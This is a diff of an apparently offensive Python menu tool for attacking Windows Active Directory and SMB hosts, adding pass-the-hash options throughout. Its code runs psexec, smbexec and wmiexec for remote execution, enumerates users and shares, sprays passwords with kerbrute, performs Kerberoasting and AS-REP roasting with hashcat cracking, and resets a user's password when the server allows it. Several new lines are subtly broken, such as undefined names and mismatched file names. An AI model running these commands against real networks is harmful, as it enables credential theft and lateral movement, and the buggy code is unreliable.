-         checkParams = 1
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
+      checkParams = testTwo(checkParams)
          
       if checkParams != 1:
-         if USR.rstrip(" ") != "Administrator":
             command(keypath + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " -service-name LUALL.exe")
       prompt()
 
@@ -1289,16 +1288,8 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '26':
-      checkParams = 0
+      checkParams = testTwo(checkParams)
       
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         checkParams = 1
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         checkParams = 1
-
       if checkParams != 1:
          command(keypath + "smbexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
       prompt()
@@ -1312,15 +1303,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '27':
-      checkParams = 0
-      
-      if TIP[:5] == "EMPTY":
-         print("\n[-] Remote IP address has not been specified...")
-         checkParams = 1
-
-      if DOM[:5] == "EMPTY":
-         print("\n[-] Domain name has not been specified...")
-         checkParams = 1
+      checkParams = testTwo(checkParams)
 
       if checkParams != 1:
          command(keypath + "wmiexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
@@ -1335,7 +1318,8 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '28':
-      if TIP[:5] != "EMPTY":
+      checkParams = testOne(checkParams)
+      if checkParams != 1:
          command(keypath + "ifmap.py " + TIP.rstrip(" ") + " 135")
       prompt()
 
@@ -1348,11 +1332,13 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '29':
-      ifmap = input("[*] Please enter MSRPC interface (ifmap) : ")    
-      ifmap = ifmap.replace("v",'')
-      ifmap = ifmap .replace(":",'')
+      checkParams = testOne(checkParams)
       
-      if ifmap != "" and TIP[:5] != "EMPTY":
+      if checkParams != 1:
+         ifmap = input("[*] Please enter MSRPC interface (ifmap) : ")    
+         ifmap = ifmap.replace("v",'')
+         ifmap = ifmap .replace(":",'')
+         
          command(keypath + "opdump.py " + TIP.rstrip(" ") + " 135 " + ifmap)
       prompt()
 
@@ -1366,8 +1352,9 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '30':
-      if TIP[:5] != "EMPTY":
-         print ("")
+      checkParams = testOne(checkParams)
+      
+      if checkParams != 1:
          command("enum4linux -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -v " + TIP.rstrip(" "))
       prompt()
 
@@ -1380,15 +1367,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='31':
-      checkParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
+      checkParams = testTwo(checkParams)
 
       if checkParams != 1:
          command(keypath + "windapsearch.py -d " + TIP.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -GUC --da --full")
@@ -1403,81 +1382,76 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='32':
-      checkParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
+      checkParams = testTwo(checkParams)
 
       if checkParams != 1:
          print("[*] Enumerating, please wait....")
-         command(keypath + "lookupsid.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > DOMAIN.tmp")         
+         command(keypath + "lookupsid.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > domain.tmp")         
          
-         command("cat DOMAIN.tmp | grep 'Domain SID' > SID.tmp")
-         SIDID = linecache.getline("SID.tmp", 1)
-         if SIDID != "":
+         command("cat domain.tmp | grep 'Domain SID' > sid.tmp")
+         
+         with open("sid.tmp", "r") as read:
+            line1 =  read.readline()
+         read.close()
+         
+         if line1 != "":
             if SID[:5] == "EMPTY":
-               SID = SIDID.replace('[*] Domain SID is: ',"")
+               SID = line1.replace('[*] Domain SID is: ',"")
                print("[+] Domain SID found...\n")
                command("echo " + SID + "\n")
          if SID[:5] == "EMPTY":
             print("[-] Unable to find domain SID...")
-         os.remove("SID.tmp")
          
-         command("sed -i /*/d DOMAIN.tmp")
-         command("sed -i 's/.*://g' DOMAIN.tmp")   
-         command("cat DOMAIN.tmp | grep SidTypeAlias | sort > ALIAS.tmp")      
-         command("cat DOMAIN.tmp | grep SidTypeGroup | sort > GROUP.tmp")
-         command("cat DOMAIN.tmp | grep SidTypeUser  | sort > USERS.tmp")
+         command("sed -i /*/d domain.tmp")
+         command("sed -i 's/.*://g' domain.tmp")   
+         command("cat domain.tmp | grep SidTypeAlias | sort > alias.tmp")      
+         command("cat domain.tmp | grep SidTypeGroup | sort > group.tmp")
+         command("cat domain.tmp | grep SidTypeUser  | sort > users.tmp")
          
-         command("sed -i 's/(SidTypeAlias)//g' ALIAS.tmp")
-         command("sed -i 's/(SidTypeGroup)//g' GROUP.tmp")
-         command("sed -i 's/(SidTypeUser)//g'  USERS.tmp")
+         command("sed -i 's/(SidTypeAlias)//g' alias.tmp")
+         command("sed -i 's/(SidTypeGroup)//g' group.tmp")
+         command("sed -i 's/(SidTypeUser)//g'  users.tmp")
          
-         if os.path.getsize("ALIAS.tmp") != 0:
+         if os.path.getsize("alias.tmp") != 0:
             print("[+] Found Aliases...\n")
             command("tput setaf 2; tput bold")
-            command("cat ALIAS.tmp")
+            command("cat alias.tmp")
             command("tput sgr0; tput dim")
          else:
             print("[-] Unable to find aliases...")
             
-         if os.path.getsize("GROUP.tmp") != 0:
+         if os.path.getsize("group.tmp") != 0:
             print("\n[+] Found Groups...\n")
             command("tput setaf 2; tput bold")
-            command("cat GROUP.tmp")
+            command("cat group.tmp")
             command("tput sgr0; tput dim")
          else:
             print("[-] Unable to find groups...")
             
-         if os.path.getsize("USERS.tmp") != 0:
+         if os.path.getsize("users.tmp") != 0:
             print("\n[+] Found Users...\n")
             command("tput setaf 2; tput bold")
-            command("cat USERS.tmp")  
+            command("cat users.tmp")  
             command("tput sgr0; tput dim")
          else:
             print("[-] Unable to find usernames...")
          
-         if os.path.getsize("USERS.tmp") != 0:
-            command("rm usernames.txt")		# DELETE OLD
-            command("touch usernames.txt")	# CREATE NEW
+         if os.path.getsize("users.tmp") != 0:
+            command("rm usernames.txt")				# PURGE OLD FILE
          
-            for x in range(0, maximum):
-               username = linecache.getline("USERS.tmp", x + 1)
-               if username != "":
-                  try:
-                     null,USER[x] = username.split(DOM.rstrip(" ") + "\\")
-                  except ValueError:
-                     USER[x] = "Error..."
-                  if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
-                  command("echo " + USER[x] + " >> usernames.txt")
-               else:
-                  USER[x] = " "*COL3      
-            command("rm *.tmp")         
+            with open("users.tmp", "r") as read:
+               for x in range(0, maximum):
+                  line1 = red.readline()                  
+                  if line1 != "":
+                     try:
+                        null,USER[x] = line1.split(DOM.rstrip(" ") + "\\")
+                     except ValueError:
+                        USER[x] = "Error..."
+                     USER[x] = spacePadding(USER[x], COL3)
+                     command("echo " + USER[x] + " >> usernames.txt")
+                  else:
+                     USER[x] = " "*COL3
+            read.close()      
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1489,47 +1463,43 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='33':
-      checkParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
+      checkParams = testTwo(checkParams)
 
       if checkParams != 1:
          print("[*] Enumerating users, please wait this can take sometime...\n")
-         os.remove("usernames.txt")					# DELETE CURRENT VERSION
-         command("touch usernames.txt")					# CREATE EMPTY NEW ONE
-         command(keypath + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > USERS.tmp")
-         command("sed -i -n '/Found user: /p' USERS.tmp")		# SELECT ONLY FOUND USERS
-         command("cat USERS.tmp | sort > USERS2.tmp")			# SORT USERS ALPHANUMERICALLY 
-         os.remove("USERS.tmp")
-         command("mv USERS2.tmp USERS.tmp")      
+                  
+         command(keypath + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > users.tmp")
+         
+         if os.path.getsize("users.tmp") != 0:
+            os.remove("usernames.txt") 
+                    
+            command("sed -i -n '/Found user: /p' USERS.tmp")		# SELECT ONLY FOUND USERS
+            command("cat USERS.tmp | sort > USERS2.tmp")			# SORT USERS ALPHANUMERICALLY 
+            os.remove("USERS.tmp")
+            command("mv USERS2.tmp USERS.tmp")      
 
-         for x in range (0, maximum):
-            USER[x] = linecache.getline('USERS.tmp', x+1)
-            if USER[x] != "":
-               USER[x] = USER[x].replace("Found user: ", "")
-               USER[x] = USER[x].split(",")
-               USER[x] = USER[x][0]
-               USER[x] = padding(USER[x], COL3)
-               if USER[x] != "":
-                  print(colored(USER[x],colour2))
-
-                  command("echo " + USER[x] + " >> usernames.txt")	# ASSIGN USERS NAME
-               else:
-                  USER[x] = " "*COL3					# ASSIGN EMPTY USERS
-               PASS[x] = "."*COL4					# RESET PASSWORDS
-            else:
-               USER[x] = " "*COL3
-               PASS[x] = " "*COL4   
-   
-         os.remove("USERS.tmp")	# CLEAR WORK FILE
-         if USER[1][:1] == " ":
-            print ("[*] No entries received.")
+            with open("users.tmp", "r") as read:
+               for x in range (0, maximum):
+                  USER[x] = read.readline()
+                  
+                  if USER[x] != "":
+                     USER[x] = USER[x].replace("Found user: ", "")
+                     USER[x] = USER[x].split(",")
+                     USER[x] = USER[x][0]
+                     USER[x] = spacePadding(USER[x], COL3)
+                     
+                     if USER[x] != "":
+                       print(colored(USER[x],colour2))
+                       command("echo " + USER[x] + " >> usernames.txt")		# ASSIGN USERS NAME
+                     else:
+                        USER[x] = " "*COL3					# ASSIGN EMPTY USERS
+                        PASS[x] = "."*COL4					# RESET PASSWORDS
+                  else:
+                     USER[x] = " "*COL3
+                     PASS[x] = " "*COL4   
+         else:
+            if USER[1][:1] == " ":
+               print ("[*] No entries were found...")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1542,15 +1512,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='34':
-      checkParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
+      checkParams = testTwo(checkParams)
 
       if checkParams != 1:
          command(keypath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " query -keyName HKLM\\\SOFTWARE\\\Policies\\\Microsoft\\\Windows -s")
@@ -1565,15 +1527,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='35':
-      checkParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
+      checkParams = testTwo(checkParams)
 
       if checkParams != 1:
          command(keypath + "rpcdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
@@ -1588,21 +1542,13 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '36':
-      checkParams = 0
+      checkParams = testTwo(checkParams)
       
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
-
       if checkParams != 1:
          if NTM[:5] == "EMPTY":
             command("rpcclient -U " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" "))
          else:
-            print("[*] Using the HASH value as a login credential...\n")
+            print("[i] Using HASH value as password login credential...\n")
             command("rpcclient -U " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ")) 
       prompt()
 
@@ -1615,44 +1561,47 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='37':
-      checkParams = 0
-      
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
+      checkParams = testOne(checkParams)
          
-      if PAS != '':
-         if checkParams != 1:
+      if checkParams != 1:
+         if NTM != "EMPTY":
+            print("[i] Using HASH value as password credential...")
+            command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash > shares.tmp")
+         else:
+            command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' > shares.tmp")
+            
+         if os.path.getsize("shares.tmp") != 0:
             os.remove("shares.txt")
-            command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " > shares.txt")
          
             command("tput setaf 2")
-            command("cat shares.txt")
+            command("cat shares.tmp")
             command("tput sgr0")
          
-            command("sed -i /'is an IPv6 address'/d shares.txt")	# TIDY UP THE FILE READY FOR READING
-            command("sed -i /Sharename/d shares.txt")
-            command("sed -i /-/d shares.txt")
-            command("sed -i '/^$/d' shares.txt")
+            command("sed -i /'is an IPv6 address'/d shares.tmp")	# TIDY UP THE FILE READY FOR READING
+            command("sed -i /Sharename/d shares.tmp")
+            command("sed -i /-/d shares.tmp")
+            command("sed -i '/^$/d' shares.tmp")
       
-            count = len(open('shares.txt').readlines( ))                
-            if count > 0:
-               cleanshares()					# PURGE CURRENT SHARE VALUES STORED IN MEMORY
+            cleanShares()						# PURGE CURRENT SHARE VALUES STORED IN MEMORY
+            count = len(open('shares.tmp').readlines()) 
          
-            for x in range(0, count):
-               test = linecache.getline("shares.txt",x + 1).rstrip(" ")
-               if test != '':
-                  SHAR[x] = test.lstrip()
-                  SHAR[x] = padding(SHAR[x], COL2)			# REPOPULATE SHARE
+            with open("shares.tmp", "r") as read:
+               for x in range(0, count):
+                  line = read.readline().rstrip("\n")
+
+                  if line != "":
+                     SHAR[x] = line.lstrip()
+                     SHAR[x] = spacePadding(SHAR[x], COL2)		# REPOPULATE SHARE
             
-               if x == 0:
-                  if SHAR[0] == "session setup failed: NT_STATUS_PASSWORD_MUS":
-                     print(colored("[!] Bonus!! It looks like we can change this paricular users password...", colour4))
-                     command("smbpasswd -r " + TIP.rstrip(" ") + " -U " + USR.rstrip(" "))
-                     print("[+] Password has been reset for this user...")
-      else:
-         if NTM != "":
-            command(keypath + "smbclient.py -hashes :" + NTM.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))                    
+                  if x == 0:
+                     if SHAR[0] == "session setup failed: NT_STATUS_PASSWORD_MUS":
+                        print(colored("[!] Bonus!! It looks like we can change this paricular users password...", colour4))
+                        command("smbpasswd -r " + TIP.rstrip(" ") + " -U " + USR.rstrip(" "))
+                        print("[+] Password has been reset for this user...")
+               read.close()
+               command("mv shares.tmp shares.txt")
+         else:
+            print("[-] Unable to obtains shares...")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -1664,20 +1613,15 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '38':
-      checkParams = 0
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
-         
-      if ":" in TIP.rstrip(" "):
-         print(colored("[!] WARNING!!! - IP6 is currently not supported...", colour4))
-#         checkParams = 1
+      checkParams = testTwo(checkParams)
+      
+      if IP46 == "-6":
+         print(colored("[!] WARNING!!! - Not compatable with IP6...",colour4))
       
       if checkParams != 1:
-         if DOM[:5] == "EMPTY":
-            print("")
-            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -H " + TIP.rstrip(" ") + " -s " + TSH.rstrip(" ") + " -R")
+         if NTM[:5] != "EMPTY":
+            print("[i] Using HASH value as password credential...")
+            command("smbmap -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -s " + TSH.rstrip(" ") + "R")      
          else:
             command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -s " + TSH.rstrip(" ") + "R")
       prompt()
@@ -1691,11 +1635,14 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '39':
-      if TIP[:5] != "EMPTY":
-         print("")
-         command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" "))
-      else:
-         print("[-] Remote IP address has not been specified...")
+      checkParams = testOne(checkParams)
+      
+      if checkParams != 1:
+         if NTM[:5] != "EMPTY":
+            print("[i] Using HASH value as password credential...")
+            command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash")
+         else:
+            command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1707,18 +1654,14 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '40':
-      checkParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
+      checkParams = checkTwo(checkParams)
 
       if checkParams != 1:
-         command(keypath + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -dc-ip "  + TIP.rstrip(" "))
+         if NTM[:5] != "EMPTY":
+            print("[i] Using HASH value as password credential...")
+            command(keypath + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") +" -dc-ip "  + TIP.rstrip(" "))
+         else:
+            command(keypath + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -dc-ip "  + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1730,16 +1673,8 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '41':
-      checkParams = 0
+      checkParams = testTwo(checkParams)
       
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
-
       if checkParams != 1:
          print("[*] Enumerating, please wait...")
          command("nmap " + IP46 + " -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + DOM.rstrip(" ") + ", userdb=usernames.txt\' " + TIP.rstrip(" ") + " >> users.tmp")
@@ -1755,72 +1690,72 @@ while True:
                if line != "":
                   command("echo " + line + " >> rvalid.tmp")
          read.close()
-                  
-         if os.path.exists("rvalid.tmp"):
-            print("[+] Only the following users are valid...\n")         
-            command("tput setaf 2")
-            command("cat rvalid.tmp")
-            command("tput sgr0")            
-            
-            count = len(open('rvalid.tmp').readlines())					# FIND OUT HOW MANY TO PROCESS
+         
+         count = len(open('rvalid.tmp').readlines())					# FIND OUT HOW MANY TO PROCESS
                        
+         with open("rvalid.tmp", "r") as read:
             for x in range(0, count):
-               linecache.clearcache()
-               validname = linecache.getline("rvalid.tmp", x + 1).rstrip("\n")
+               line1 = read.readline().rstrip("\n")
                
                for y in range(0, maximum):
-                  linecache.clearcache()
                   checkuser = linecache.getline("usernames.txt", y + 1).rstrip("\n")
                   checkhash = linecache.getline("hashes.txt", y + 1).rstrip("\n")
                   
-                  if validname == checkuser:                    
+                  if line1 == checkuser:
                      command("echo " + checkuser + " >> topusers.tmp")
                      
                      if "$" in checkuser:
-                        with open("usernames.txt", "r") as read:				# ONLY WAY TO DEAL WITH APT$ 
-                            for line in read:
-                                line = line.rstrip("\n")
-                                if line != checkuser:
-                                   line = line.replace("$", "\$")
-                                   command("echo " + line + " >> newusers.tmp")
-                        read.close()
+                        with open("usernames.txt", "r") as read2:				# ONLY WAY TO DEAL WITH CHARCTER $ IN NAME 
+                            for line2 in read2:
+                                line2 = line2.rstrip("\n")
+                                if line2 != checkuser:
+                                   line2 = line2.replace("$", "\$")
+                                   command("echo " + line2 + " >> newusers.tmp")
+                        read2.close()
                   
                         command("rm usernames.txt")
                         command("mv newusers.tmp usernames.txt")
                      else:
                         command("gawk -i inplace '!/" + checkuser + "/' usernames.txt")
-                        
+                     
                      command("echo " + checkhash + " >> tophash.tmp")
                      command("sed -i '/" + checkhash + "/d' hashes.txt")
+         
+         read.close()
+         command("cat usernames.txt >> topusers.tmp")
+         command("rm usernames.txt")
+         command("mv topusers.tmp usernames.txt")         
+         command("cat hashes.txt >> tophash.tmp")
+         command("rm hashes.txt")
+         command("mv tophash.tmp hashes.txt")
+         
+         cleanUsers()
+         linecache.checkcache()
             
-            command("cat usernames.txt >> topusers.tmp")
-            command("rm usernames.txt")
-            command("mv topusers.tmp usernames.txt")
+         for x in range (0, maximum):
+            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip("\n")
+            USER[x] = spacePadding(USER[x], COL3)
             
-            command("cat hashes.txt >> tophash.tmp")
-            command("rm hashes.txt")
-            command("mv tophash.tmp hashes.txt")
-
-            cleanusers()
-            linecache.checkcache(filename=None)
+            PASS[x] = linecache.getline("hashes.txt", x + 1).rstrip("\n")
+            PASS[x] = spacePadding(PASS[x], COL4)
             
-            for x in range (0, maximum):
-               USER[x] = linecache.getline("usernames.txt", x + 1).rstrip("\n")
-               USER[x] = padding(USER[x], COL3)
-               
-               PASS[x] = linecache.getline("hashes.txt", x + 1).rstrip("\n")
-               PASS[x] = padding(PASS[x], COL4)
-
-            count = len(open('rvalid.tmp').readlines())					# FIND OUT HOW MANY TO PROCESS                                  
-            for x in range(0, count):
-               validname2 = linecache.getline("rvalid.tmp", x + 1).rstrip("\n")
-               
-               for y in range(0, maximum):
-                  checkuser2 = linecache.getline("usernames.txt", y + 1).rstrip("\n")
-                  if validname2 == checkuser2:
-                     VALD[y] = 1							# ASSIGN A TOKEN TO THIS USER
-         else:
-            print("No users where found, check that the domain name is correct...")     
+         count = len(open('rvalid.tmp').readlines())					# FIND OUT HOW MANY TO PROCESS                                  
+         
+         for x in range(0, count):
+            validname2 = linecache.getline("rvalid.tmp", x + 1).rstrip("\n")
+           
+            for y in range(0, maximum):
+               checkuser2 = linecache.getline("usernames.txt", y + 1).rstrip("\n")
+               if validname2 == checkuser2:	
+                  VALD[y] = 1								# ASSIGN A TOKEN TO THIS USER
+          	
+         if os.path.exists("rvalid.tmp"):
+            print("[+] Only the following users are valid...\n")         
+            command("tput setaf 2")
+            command("cat rvalid.tmp")
+            command("tput sgr0")                      
+      else:
+         print("[-] No users where found, check to see if the domain name is correct...")     
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1832,40 +1767,30 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='42':
-      checkParams = 0
+      checkParams = testTwo(checkParams)
+      found = 0
       
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
-
       if checkParams != 1:
-         found = 0
          print("[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...")
          command("kerbrute -domain " + DOM.rstrip(" ") + " -users usernames.txt -password " + PAS.rstrip(" ") + " -outputfile bpassword1.tmp")
 
-         test1 = linecache.getline("bpassword1.tmp", 1)
-         test1 = test1.rstrip("\n")
-         if test1 != "":
+         test1 = len(open('bpassword1.tmp').readlines())
+         if test1 > 0:
             found = 1
-            USR,PAS = test1.split(":")
-            if len(USR) < COL1: USR = padding(USR, COL1)
-            if len(PAS) < COL1: PAS = padding(PAS, COL1)
+            USR,PAS = testOne.split(":")
+            USR = spacePadding(USR, COL1)
+            PAS = spacePadding(PAS, COL1)
 
          if found == 0:
             print("\n[*] Now trying all usernames with matching passwords...")
             command("kerbrute -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords usernames.txt -outputfile bpassword2.tmp")
          
-         test2 = linecache.getline("bpassword2.tmp", 1)
-         test2 = test2.rstrip("\n")
-         if test2 != "":
+         test2 = len(open('bpassword2.tmp').readlines())
+         if test2 > 0:
             found = 1
-            USR,PAS = test2.split(":")
-            if len(USR) < COL1: USR = padding(USR, COL1)
-            if len(PAS) < COL1: PAS = padding(PAS, COL1)
+            USR,PAS = testTwo.split(":")
+            USR = spacePadding(USR, COL1)
+            PAS = spacePadding(PAS, COL1)
 
          if found == 0:
             print("\n[*] Now trying all users with random passwords, please wait as this could take sometime...")
@@ -1882,7 +1807,7 @@ while True:
                      if test3 != "":
                         USRX,PASX = test3.split(":") 
                         print("[+] User " + USRX + " has associated password " + PASX + "...")
-                        os.remove("bpassword3.tmp")
+                        break
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1894,21 +1819,18 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '43':
-      checkParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
-
+      checkParams = testTwo(checkParams)
+      
       if checkParams != 1:
          if linecache.getline('usernames.txt', 1) != " ":
-            command(keypath + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -outputfile hashroast1.txt")
+            if NTM[:5] != "EMPTY":
+               print("[i] Using HASH value as password credential...")
+               command(keypath + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") +" -outputfile hashroast1.tmp")
+            else:
+               command(keypath + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -outputfile hashroast1.tmp")
+              
             print("[*] Cracking hash values if they exists...\n")
-            command("hashcat -m 13100 --force -a 0 hashroast1.txt /usr/share/wordlists/rockyou.txt -o cracked1.txt")
+            command("hashcat -m 13100 --force -a 0 hashroast1.tmp /usr/share/wordlists/rockyou.txt -o cracked1.txt")
             command("strings cracked1.txt")
          else:
             print("[-] The file usernames.txt is empty...")
@@ -1923,21 +1845,18 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='44':
-      checkParams = 0
-
-      if DOM[:5] == "EMPTY":
-         print("[-] Domain name has not been specified...")
-         checkParams = 1
-
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote IP address has not been specified...")
-         checkParams = 1
+      checkParams = testTwo(checkParams)
 
       if checkParams != 1:
          if linecache.getline('usernames.txt', 1) != " ":
-            command(keypath + "GetNPUsers.py -outputfile hashroast2.txt -format hashcat " + DOM.rstrip(" ") + "/ -usersfile usernames.txt")
+            if NTM[:5] != "EMPTY":
+               print("[i] Using HASH value as password credential...")
+               command(keypath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile usernames.txt")
+            else:
+               command(keypath + "GetNPUsers.py -outputfile hashroast2.tmp -format hashcat " + DOM.rstrip(" ") + "/ -usersfile usernames.txt")
+               
             print("[*] Cracking hash values if they exists...\n")
-            command("hashcat -m 18200 --force -a 0 hashroast2.txt /usr/share/wordlists/rockyou.txt -o cracked2.txt")
+            command("hashcat -m 18200 --force -a 0 hashroast2.tmp /usr/share/wordlists/rockyou.txt -o cracked2.txt")
             command("strings cracked2.txt")
          else:
             print("[-] The file usernames.txt is empty...")
@@ -1952,15 +1871,17 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '45':
-      if TIP[:5] != "EMPTY" and PAS[:1] != "\"":
+      if PAS[:1] != "\"":
          NTM = hashlib.new("md4", PAS.rstrip(" ").encode("utf-16le")).digest()
          NTM = binascii.hexlify(NTM)
          NTM = str(NTM)
          NTM = NTM.lstrip("b'")
          NTM = NTM.rstrip("'")
+         
          for x in range(0, maximum):
-            if USER[x].rstrip(" ") == USR.rstrip(" "): PASS[x] = NTM.rstrip(" ") # RESET USERS HASH
-         NTM = padding(NTM, COL1)
+            if USER[x].rstrip(" ") == USR.rstrip(" "):
+               PASS[x] = NTM.rstrip(" ") 			# RESET USERS HASH
+         NTM = spacePadding(NTM, COL1)
       else:
          print("[-] Password not found...")
       prompt()
